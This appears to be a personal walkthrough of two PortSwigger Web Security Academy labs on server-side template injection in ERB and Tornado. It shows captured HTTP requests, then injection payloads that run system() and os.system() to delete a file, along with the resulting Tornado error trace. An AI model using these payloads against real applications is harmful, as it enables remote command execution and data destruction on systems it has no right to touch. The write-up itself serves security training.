### <u>Lab: Basic server-side template injection
For this lab we are told there is a vulnerability due to the unsafe construction of an ERB template. When we try open the first product shown on the catalog we get the message "Unfortunately this product is out of stock" which is shown on our screen. Looking at the burp http history we find a request:
```
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
Host: 0a4000c304ae989c804a216300b60089.web-security-academy.net
Cookie: session=rtLpQI4Soenj8wMmnNyU1SbdatX4Y2pC
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4000c304ae989c804a216300b60089.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Now looking at ERB documentation we can change the request to see if we can execute commands using system().
By using the request below we can delete the file.
```
GET /?message=<%25%3d+system('rm+morale.txt')+%25>
```

### <u>Lab: Basic server-side template injection (code context)
In this lab instead Tornado as template engine and we have a comment section in posts. After logging in we see we can change our preferred name and when we do this this request is sent:
```
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0adb008104e0d4349d556ea500d40091.web-security-academy.net
Cookie: session=LtI4PJuu21HxXAzlvMgYZuMR6nYRFEUI
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: https://0adb008104e0d4349d556ea500d40091.web-security-academy.net
Referer: https://0adb008104e0d4349d556ea500d40091.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

blog-post-author-display=user.nickname&csrf=QsoccjcYx58Qo1Ad7rGtH14rfAssSKWn
```
Looking at this request I see that mabye the blog-post-author-display parameter can be used as a vulnerability to execute some commands since it gets displayed in comments. Using { } in tornado we can insert something and since it is a python template engine to run a command we need to import os and os.system("some command"). So when we first put this request with these parameters:
```
blog-post-author-display={import+os%3b+os.system('rm+morale.txt')+}
```
We get the error:
```
No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "<string>.generated.py", line 5 _tt_tmp = import os; os.system('rm morale.txt') # <string>:1 ^ SyntaxError: invalid syntax
```
Now we can see that the code is being inserted into a variable declaration so if we just end that line by assigning the variable to some string and ending the line we can execute our own code so we the parameter:
```
blog-post-author-display={'a'%3b+import+os%3b+os.system('rm+morale.txt')+}
```
